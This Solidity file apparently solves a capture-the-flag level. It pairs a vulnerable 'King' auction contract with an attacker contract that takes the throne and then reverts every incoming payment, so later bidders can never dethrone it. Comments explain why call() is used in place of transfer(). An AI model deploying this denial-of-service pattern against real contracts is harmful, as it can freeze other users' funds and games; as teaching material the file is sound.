// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingIsMine{
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        require(msg.sender == owner);
        // this will cause the King Contract instance to fail since it's not the owner (your wallet address when you deploy KingIsMine)
    }

    function claimKing(address _address) external payable {
        payable(_address).call{value: msg.value}("");
        // NOTE 
        // payable(_address).transfer(msg.value); 
        // will not work since transfer has a gas limit o 2300 which is only enough to complete the transfer of funds
        // we need to use call since it has no gas limit so that we can trigger other functions within the fallback() function

    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}